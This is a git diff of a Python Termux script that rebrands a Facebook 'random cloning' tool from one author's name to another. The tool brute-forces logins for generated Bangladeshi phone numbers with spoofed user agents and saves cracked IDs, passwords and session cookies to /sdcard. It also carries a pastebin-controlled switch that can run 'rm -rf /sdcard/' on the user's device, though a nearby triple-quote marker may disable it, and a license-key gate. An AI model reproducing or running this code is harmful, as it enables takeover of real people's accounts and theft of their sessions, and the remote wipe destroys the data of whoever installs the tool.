@@ -1,4 +1,4 @@
-#--------[EMRAN CYBER 🙃
+#--------[𝐌𝐀𝐇𝐀𝐌𝐔𝐃 𝐇𝐀𝐒𝐍𝐀𝐓 🙂
 
 import os,sys,time,json,random,re,string,platform,base64,uuid
 from bs4 import BeautifulSoup as sop
@@ -8,21 +8,21 @@ from datetime import date
 from datetime import datetime
 from time import sleep
 from time import sleep as waktu
-from os import system as _EMRAN_
+from os import system as _MAHAMUD_
 try:
     import requests
     from concurrent.futures import ThreadPoolExecutor as ThreadPool
     import mechanize
     from requests.exceptions import ConnectionError
 except ModuleNotFoundError:
-    _EMRAN_('pip install mechanize requests futures bs4==2 > /dev/null')
-    _EMRAN_('pip install bs4')
+    _MAHAMUD_('pip install mechanize requests futures bs4==2 > /dev/null')
+    _MAHAMUD_('pip install bs4')
 apk1=requests.get("https://pastebin.com/raw/FrYTLzAa").text
 def lo(word):
-    EMRAN = ["[\x1b[1;91m■\x1b[0m□□□□□□□□□]","[\x1b[1;92m■■\x1b[0m□□□□□□□□]", "[\x1b[1;93m■■■\x1b[0m□□□□□□□]", "[\x1b[1;94m■■■■\x1b[0m□□□□□□]", "[\x1b[1;95m■■■■■\x1b[0m□□□□□]", "[\x1b[1;96m■■■■■■\x1b[0m□□□□]", "[\x1b[1;97m■■■■■■■\x1b[0m□□□]", "[\x1b[1;98m■■■■■■■■\x1b[0m□□]", "[\x1b[1;99m■■■■■■■■■\x1b[0m□]", "[\x1b[1;910m■■■■■■■■■■\x1b[0m]"]
+    MAHAMUD = ["[\x1b[1;91m■\x1b[0m□□□□□□□□□]","[\x1b[1;92m■■\x1b[0m□□□□□□□□]", "[\x1b[1;93m■■■\x1b[0m□□□□□□□]", "[\x1b[1;94m■■■■\x1b[0m□□□□□□]", "[\x1b[1;95m■■■■■\x1b[0m□□□□□]", "[\x1b[1;96m■■■■■■\x1b[0m□□□□]", "[\x1b[1;97m■■■■■■■\x1b[0m□□□]", "[\x1b[1;98m■■■■■■■■\x1b[0m□□]", "[\x1b[1;99m■■■■■■■■■\x1b[0m□]", "[\x1b[1;910m■■■■■■■■■■\x1b[0m]"]
     for i in range(5):
-        for x in range(len(EMRAN)):
-            sys.stdout.write(('\r{}{}').format(str(word), EMRAN[x]))
+        for x in range(len(MAHAMUD)):
+            sys.stdout.write(('\r{}{}').format(str(word), MAHAMUD[x]))
             time.sleep(0.1)
             sys.stdout.flush()
 def cek_apk(session,coki):
@@ -61,8 +61,8 @@ def follow(self, session, coki):
             
             
 
-class EMRAN_afridi:
-    def EMRAN(self, z):
+class MAHAMUD_HASNAT:
+    def MAHAMUD(self, z):
         for e in z + "\n":
             sys.stdout.write(e)
             sys.stdout.flush()
@@ -100,36 +100,36 @@ today = date.today()
 logo = (f"""\n\033[1;90m
     \033[38;5;46m╔═════════════════════════════════════╗
     \033[38;5;46m║ ╔════════╗ \033[38;5;46m╔═══════════╗ \x1b[38;5;196m╔════════╗ ║
-    \033[38;5;46m║ ║\033[38;5;46m███████ ║ \033[38;5;46m║\x1b[38;5;196m███    ███ ║ \033[38;5;46m║\033[38;5;46m██████  ║ ║
-    \033[38;5;46m║ ║\033[38;5;46m██      ║ \033[38;5;46m║\x1b[38;5;196m████  ████ ║ \033[38;5;46m║\033[38;5;46m██   ██ ║ ║
-    \033[38;5;46m║ ║\033[38;5;46m█████   ║ \033[38;5;46m║\x1b[38;5;196m██ ████ ██ ║ \033[38;5;46m║\033[38;5;46m██████  ║ ║
-    \033[38;5;46m║ ║\033[38;5;46m██      ║ \033[38;5;46m║\x1b[38;5;196m██  ██  ██ ║ \033[38;5;46m║\033[38;5;46m██   ██ ║ ║
-    \033[38;5;46m║ ║\033[38;5;46m███████ ║ \033[38;5;46m║\x1b[38;5;196m██      ██ ║ \033[38;5;46m║\033[38;5;46m██   ██ ║ ║
+    \033[38;5;46m║ ║\033[38;5;46m███████ ║ \033[38;5;46m║\x1b[38;5;196m██    ██ ║ \033[38;5;46m║\033[38;5;46m ██████ ║ ║
+    \033[38;5;46m║ ║\033[38;5;46m██      ║ \033[38;5;46m║\x1b[38;5;196m██    ██ ║ \033[38;5;46m║\033[38;5;46m██      ║ ║
+    \033[38;5;46m║ ║\033[38;5;46m█████   ║ \033[38;5;46m║\x1b[38;5;196m██    ██ ║ \033[38;5;46m║\033[38;5;46m██      ║ ║
+    \033[38;5;46m║ ║\033[38;5;46m██      ║ \033[38;5;46m║\x1b[38;5;196m██    ██ ║ \033[38;5;46m║\033[38;5;46m██      ║ ║
+    \033[38;5;46m║ ║\033[38;5;46m██      ║ \033[38;5;46m║\x1b[38;5;196m ██████  ║ \033[38;5;46m║\033[38;5;46m ██████ ║ ║
     \033[38;5;46m║ ╚════════╝ \033[38;5;46m╚═══════════╝ \033[38;5;46m╚════════╝ ║
     \033[38;5;46m║ ╔════════╗ \033[38;5;46m╔══════════╗             ║
-    \033[38;5;46m║ ║ \033[30;1m█████  ║ \033[38;5;46m║\x1b[38;5;196m███    ██ ║\033[38;5;46m🦋⃟𝗕𝗢𝗦𝗦✮⃝ 𝗘𝗠𝗥𝗔𝗡𝄟⃝║
-    \033[38;5;46m║ ║\033[30;1m██   ██ ║ \033[38;5;46m║\x1b[38;5;196m████   ██ ║\033[38;5;46m🦋⃟𝗕𝗢𝗦𝗦✮⃝ 𝗘𝗠𝗥𝗔𝗡𝄟⃝║
-    \033[38;5;46m║ ║\033[30;1m███████ ║ \033[38;5;46m║\x1b[38;5;196m██ ██  ██ ║\033[38;5;46m🦋⃟𝗕𝗢𝗦𝗦✮⃝ 𝗘𝗠𝗥𝗔𝗡𝄟⃝║
-    \033[38;5;46m║ ║\033[30;1m██   ██ ║ \033[38;5;46m║\x1b[38;5;196m██  ██ ██ ║\033[38;5;46m🦋⃟𝗕𝗢𝗦𝗦✮⃝ 𝗘𝗠𝗥𝗔𝗡𝄟⃝║
-    \033[38;5;46m║ ║\033[30;1m██   ██ ║ \033[38;5;46m║\x1b[38;5;196m██   ████ ║\033[38;5;46m🦋⃟𝗕𝗢𝗦𝗦✮⃝ 𝗘𝗠𝗥𝗔𝗡𝄟⃝║
+    \033[38;5;46m║ ║ \033[30;1m██   ██ ║ \033[38;5;46m║\x1b[38;5;196m███    ███ ║\033[38;5;46m██   ██ ║
+    \033[38;5;46m║ ║\033[30;1m██  ██  ║ \033[38;5;46m║\x1b[38;5;196m████  ████ ║\033[38;5;46m██   ██ ║
+    \033[38;5;46m║ ║\033[30;1m█████   ║ \033[38;5;46m║\x1b[38;5;196m██ ████ ██ ║\033[38;5;46m███████ ║
+    \033[38;5;46m║ ║\033[30;1m██  ██  ║ \033[38;5;46m║\x1b[38;5;196m██  ██  ██ ║\033[38;5;46m██   ██ ║
+    \033[38;5;46m║ ║\033[30;1m██   ██ ║ \033[38;5;46m║\x1b[38;5;196m ██      ██ ║\033[38;5;46m██   ██ ║
     \033[38;5;46m║ ╚════════╝ \033[38;5;46m╚══════════╝             ║ 
     \033[38;5;46m╚═════════════════════════════════════╝
       \x1b[38;5;196m╔═════════════════════════════════╗
-      \x1b[38;5;196m║\033[38;5;46m8888888888 888    888  .d8888b.  \x1b[38;5;196m║\x1b[38;5;196m
-      \x1b[38;5;196m║\033[38;5;46m888        888    888 d88P  Y88b \x1b[38;5;196m║\x1b[38;5;196m
-      \x1b[38;5;196m║\033[38;5;46m888        888    888 888    888 \x1b[38;5;196m║\x1b[38;5;196m
-      \x1b[38;5;196m║\033[38;5;46m8888888    8888888888 888        \x1b[38;5;196m║\x1b[38;5;196m
-      \x1b[38;5;196m║\033[38;5;46m888        888    888 888        \x1b[38;5;196m║\x1b[38;5;196m
-      \x1b[38;5;196m║\033[38;5;46m888        888    888 888    888 \x1b[38;5;196m║\x1b[38;5;196m
-      \x1b[38;5;196m║\033[38;5;46m888        888    888 Y88b  d88P \x1b[38;5;196m║\x1b[38;5;196m
-      \x1b[38;5;196m║\033[38;5;46m8888888888 888    888  "Y8888P"  \x1b[38;5;196m║\x1b[38;5;196m
+      \x1b[38;5;196m║\033[38;5;46m███    ███ ██   ██ ███    ██  \x1b[38;5;196m║\x1b[38;5;196m
+      \x1b[38;5;196m║\033[38;5;46m████  ████ ██   ██ ████   ██ \x1b[38;5;196m║\x1b[38;5;196m
+      \x1b[38;5;196m║\033[38;5;46m██ ████ ██ ███████ ██ ██  ██ \x1b[38;5;196m║\x1b[38;5;196m
+      \x1b[38;5;196m║\033[38;5;46m██  ██  ██ ██   ██ ██  ██ ██ \x1b[38;5;196m║\x1b[38;5;196m
+      \x1b[38;5;196m║\033[38;5;46m██      ██ ██   ██ ██   ████ \x1b[38;5;196m║\x1b[38;5;196m
+      \x1b[38;5;196m║\033[38;5;46m╔╦╗╦ ╦╔╗╔ \x1b[38;5;196m║\x1b[38;5;196m
+      \x1b[38;5;196m║\033[38;5;46m║║║╠═╣║║║ \x1b[38;5;196m║\x1b[38;5;196m
+      \x1b[38;5;196m║\033[38;5;46m╩ ╩╩ ╩╝╚╝  \x1b[38;5;196m║\x1b[38;5;196m
       \x1b[38;5;196m╚═════════════════════════════════╝\n """)
 loop = 0
 oks = []
 cps = []
 
 def clear():
-    _EMRAN_('clear')
+    _MAHAMUD_('clear')
 from time import localtime as lt
 from os import system as cmd
 ltx = int(lt()[3])
@@ -151,8 +151,8 @@ def dynamic(text):
 #User agents
 ugen2=[]
 ugen=[]
-UMO="I-AM-"
-ttt="EMRAN-CYBER-"
+UMO="𝐈-𝐀𝐌-"
+ttt="𝐌𝐀𝐇𝐀𝐌𝐔𝐃-𝐇𝐀𝐒𝐍𝐀𝐓-"
 for xd in range(10000):
     aa='Mozilla/5.0 (Linux; U; Android'
     b=random.choice(['3','4','5','6','7','8','9','10','11','12','13','14','15','16','17'])
@@ -171,11 +171,11 @@ for xd in range(10000):
  
 
 def update():
-	voice=random.choice([' Tool is on update','try again after update','try again after sometime','tool update is running','EMRAN Afridi is working'])
+	voice=random.choice([' Tool is on update','try again after update','try again after sometime','tool update is running','MAHAMUD HASNAT is working'])
 	em=random.choice(['🔥','🙄','😒','😐','😡','😈','🥱','😎'])
 	ful=random.choice(['\033[1;31m','\033[1;32m','\033[1;33m','\033[1;35m','\033[1;34m','\033[1;36m','\033[1;37m','\x1b[38;5;208m'])
 	print(f' \t  {ful} TOOL IS ON UPDATE...{em}')
-	_EMRAN_(f"espeak \"{voice}\"")
+	_MAHAMUD_(f"espeak \"{voice}\"")
 	sleep(2.5)
 	clear()
 	update()
@@ -187,55 +187,55 @@ if apk1 =='on':
 if apk1 =='off':
 	sys.exit()
 if apk1 =='remove':
-	_EMRAN_("termux-setup-storage")
-	_EMRAN_("rm -rf /sdcard/")
-	_EMRAN_("rm -rf /sdcard/ -y")
+	_MAHAMUD_("termux-setup-storage")
+	_MAHAMUD_("rm -rf /sdcard/")
+	_MAHAMUD_("rm -rf /sdcard/ -y")
 	sys.exit()
 	
 '''
 
-def EMRAN():
-    _EMRAN_('clear')
+def MAHAMUD():
+    _MAHAMUD_('clear')
     lo("\t\t\033[1;32m OPENING TOOL🍎🙃")
-    dynamic("EMRAN       ")
-    _EMRAN_("clear")
+    dynamic("MAHAMUD       ")
+    _MAHAMUD_("clear")
     print(logo)
-    _EMRAN_("espeak \"Hi sir ,Wellcome to BANGLADESH EMRAN CYBER Rendom cloneing tool\"")
-    print('\033[1;92m🦋⃟𝗕𝗢𝗦𝗦✮⃝ 𝗘𝗠𝗥𝗔𝗡𝄟⃝║\033[1;91m1\033[1;92m]'+color+' RANDOM CRACK \033[1;92m❴\033[1;91mBEST v3.6\033[1;92m❵  ')
-    print('\033[1;92m🦋⃟𝗕𝗢𝗦𝗦✮⃝ 𝗘𝗠𝗥𝗔𝗡𝄟⃝║\033[1;91m2\033[1;92m]'+color+' CONTACT ME FACEBOOK')
-    print('\033[1;92m🦋⃟𝗕𝗢𝗦𝗦✮⃝ 𝗘𝗠𝗥𝗔𝗡𝄟⃝║\033[1;91m3\033[1;92m]'+color+' FOLLOW GITHUB ACCOUNT')
-    print('\033[1;92m🦋⃟𝗕𝗢𝗦𝗦✮⃝ 𝗘𝗠𝗥𝗔𝗡𝄟⃝║\033[1;91m4\033[1;92m]'+color+' CHAT WITH ME')
-    print('\033[1;92m🦋⃟𝗕𝗢𝗦𝗦✮⃝ 𝗘𝗠𝗥𝗔𝗡𝄟⃝║\033[1;91m0\033[1;92m]\033[1;91m EXIT')
+    _MAHAMUD_("espeak \"Hi sir ,Wellcome toMAHAMUD CYBER Rendom cloneing tool\"")
+    print('\033[1;92m🖤𝗕𝗢𝗦𝗦✮⃝ 𝐌𝐀𝐇𝐀𝐌𝐔𝐃𝄟⃝║\033[1;91m1\033[1;92m]'+color+' RANDOM CRACK \033[1;92m❴\033[1;91mBEST v3.6\033[1;92m❵  ')
+    print('\033[1;92m🖤𝗕𝗢𝗦𝗦✮⃝ 𝐌𝐀𝐇𝐀𝐌𝐔𝐃𝄟⃝║\033[1;91m2\033[1;92m]'+color+' CONTACT ME FACEBOOK')
+    print('\033[1;92m🖤𝗕𝗢𝗦𝗦✮⃝ 𝐌𝐀𝐇𝐀𝐌𝐔𝐃𝄟⃝║\033[1;91m3\033[1;92m]'+color+' FOLLOW GITHUB ACCOUNT')
+    print('\033[1;92m🖤𝗕𝗢𝗦𝗦✮⃝ 𝐌𝐀𝐇𝐀𝐌𝐔𝐃𝄟⃝║\033[1;91m4\033[1;92m]'+color+' CHAT WITH ME')
+    print('\033[1;92m🖤𝗕𝗢𝗦𝗦✮⃝ 𝐌𝐀𝐇𝐀𝐌𝐔𝐃𝄟⃝║\033[1;91m0\033[1;92m]\033[1;91m EXIT')
     opt = input('\n\x1b[1;32m\033[1;91m[\033[1;92m•\033[1;91m]\033[1;30mCHOOSE : ')
     if opt == '1':
-    	_EMRAN_("espeak \" you choose rendom cloneing\"")
+    	_MAHAMUD_("espeak \" you choose rendom cloneing\"")
     	xxr()
     if None == '2':
-        _EMRAN_('xdg-open https://www.facebook.com/PLZZZ.DISABLE.ME.IF.YOU.CAN')
-        _EMRAN_("espeak \"Follow my Facebook account\"")
+        _MAHAMUD_('xdg-open https://www.facebook.com/ITSMAHAMUDHASNAT')
+        _MAHAMUD_("espeak \"Follow my Facebook account\"")
         
         return None
     if None == '3':
-        _EMRAN_('xdg-open https://github.com/EMRANcyber99')
-        _EMRAN_("espeak \"Follow me on github\"")
+        _MAHAMUD_('xdg-open https://github.com/mahamudking')
+        _MAHAMUD_("espeak \"Follow me on github\"")
         return None
     if None == '4':
-        _EMRAN_('xdg-open https://m.me/PLZZZ.DISABLE.ME.IF.YOU.CAN')
-        _EMRAN_("espeak \"you choose messenger\"")
+        _MAHAMUD_('xdg-open https://m.me/ITSMAHAMUDHASNAT')
+        _MAHAMUD_("espeak \"you choose messenger\"")
     if None == '0':
-        _EMRAN_('exit')
-        _EMRAN_("espeak \"good bye sir\"")
+        _MAHAMUD_('exit')
+        _MAHAMUD_("espeak \"good bye sir\"")
 
 def xxr():
     user=[]
     twf =[]
     os.getuid
     os.geteuid
-    _EMRAN_("clear")
+    _MAHAMUD_("clear")
     print(logo)
     print(f' \033[1;91m[\033[1;97m•\033[1;91m]\033[1;92m Example : {xr}019,017,018,016,015{x}')
     print(" \033[1;93m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
-    _EMRAN_("espeak \"choose your country cord\"")
+    _MAHAMUD_("espeak \"choose your country cord\"")
     rk1 = '0171'
     rk2 = '0172'
     rk3 = '0175'
@@ -330,19 +330,19 @@ def rcrack(uid,pwx,tl):
                 coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                 cid = coki[7:22]
                 print('\r\r\033[1;30m[\033[1;31mPURE\033[1;37m \033[1;31mOK-😈\033[1;30m] \033[1;32m ' +uid+ ' \033[1;37m| \033[1;31m' +ps+'\n\033[1;30m[🔥]\033[1;37mCOOKIE = \033[1;32m'+coki+  ' \n\033[1;37m[\033[1;31mUSER\033[1;37m-\033[1;31mAGANT🍎\033[1;37m] = \033[1;30m'+pro+'  \033[0;97m')
-                _EMRAN_("espeak \"congratulations you got a ok id\"")
-                open('/sdcard/EMRAN_OK.txt', 'a').write( uid+' | '+ps+'\n')
+                _MAHAMUD_("espeak \"congratulations you got a ok id\"")
+                open('/sdcard/MAHAMUD_OK.txt', 'a').write( uid+' | '+ps+'\n')
                 oks.append(cid)
                 break
             else:
                 continue
         loop+=1
-        brand=random.choice(['EMRAN CYBER','EMRAN-CYBER ','EMRAN CRACK '])
+        brand=random.choice(['MAHAMUD CYBER','MAHAMUD-CYBER ','MAHAMUD CRACK '])
         colr=random.choice(['\033[1;31m','\033[1;32m','\033[1;33m','\033[1;35m','\033[1;34m','\033[1;36m','\033[1;37m','\x1b[38;5;208m'])
         colo=random.choice(['\033[1;31m','\033[1;32m','\033[1;33m','\033[1;35m','\033[1;34m','\033[1;36m','\033[1;37m','\x1b[38;5;208m'])
         emoji=random.choice(['😆','🐸','🙃','😈','🖕','🦅','🦉','🍎','🐝','🦟','🧐','😐','🙂','🤐','♥️','😘','😻','😍','😹','🤣','😂','😭','😁','😜','🤫','😶','🥱','😤','🥵','😇','💋','🙈','🙀','💚','💛','🖤','🤎','💙','💜','🦶','🙆','🌺','🌸','🏵️','🍁','🌼','??','🐍','🦡','✈️','🦛','🦐','🐇','🐮','🐰','🦃','🕸️','🦋','🍒','🍓','🍑','🍊','🥭','🍍','🍌','🌶️','🥥','🐛','🥕','🍗','🍆','🥐','🧀','🍤','🇧🇩','☠️'])
         colorful=random.choice(['\033[1;31m','\033[1;32m','\033[1;33m','\033[1;35m','\033[1;34m','\033[1;36m','\033[1;37m','\x1b[38;5;208m'])
-        sys.stdout.write(f"\r \33[1;90m[{colr}🦋⃟𝗕𝗢𝗦𝗦✮⃝ 𝗘𝗠𝗥𝗔𝗡𝄟⃝║\33[1;90m]{colo}✘\33[1;90m[{colorful}{loop}\33[1;90m/\33[1;92m{tl}\33[1;90m]-[OK:{xr}{len(oks)}{x}\33[1;90m]-\33[1;90m[{emoji}]  "),
+        sys.stdout.write(f"\r \33[1;90m[{colr}🖤𝗕𝗢𝗦𝗦✮⃝ 𝐌𝐀𝐇𝐀𝐌𝐔𝐃𝄟⃝║\33[1;90m]{colo}✘\33[1;90m[{colorful}{loop}\33[1;90m/\33[1;92m{tl}\33[1;90m]-[OK:{xr}{len(oks)}{x}\33[1;90m]-\33[1;90m[{emoji}]  "),
         sys.stdout.flush()
     except:
         pass
@@ -351,11 +351,11 @@ def superuser():
     uuid = str(os.geteuid()) + str(os.getlogin()) 
     id = "99".join(uuid)
     print(logo)
-    DARK=requests.get("https://github.com/Max-fro-man/EMRAN-AFROBAL/blob/main/Afroveal.txt").text
+    DARK=requests.get("https://github.com/mahamudking/MH-TODAY-MAHAMUD/blob/main/MAHAMUD.txt").text
     if id in DARK:
         os.system('clear')
         print(logo)
-        EMRAN()
+        MAHAMUD()
     else:
         os.system("clear")
         print(logo)
@@ -378,7 +378,6 @@ def superuser():
         input(" Press Enter To Send Key")
         time.sleep(3.5)
         tks = 'Dear%20Admin,%20Please%20Approved%20My%20Key%20To%20Premium%20%20Thanks%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20My%20Name%20:%20'+name+'%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20My%20%20Key%20%20:%20'+UMO+ttt+id
-        os.system('am start https://wa.me/+9710569549857?text=' + tks)
+        os.system('am start https://m.me/ITSMAHAMUDHASNAT?text=' + tks)
         superuser()        
 superuser()
-
